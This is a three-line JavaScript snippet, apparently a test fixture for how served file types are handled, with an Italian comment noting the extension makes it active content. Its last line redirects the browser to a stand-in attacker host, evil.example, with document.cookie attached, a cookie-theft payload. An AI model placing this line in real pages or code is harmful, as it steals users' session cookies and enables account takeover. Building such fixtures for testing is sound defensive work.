// Dichiarato come application/javascript dall'estensione: contenuto attivo.
console.log("payload");
document.location = "https://evil.example/steal?c=" + document.cookie;
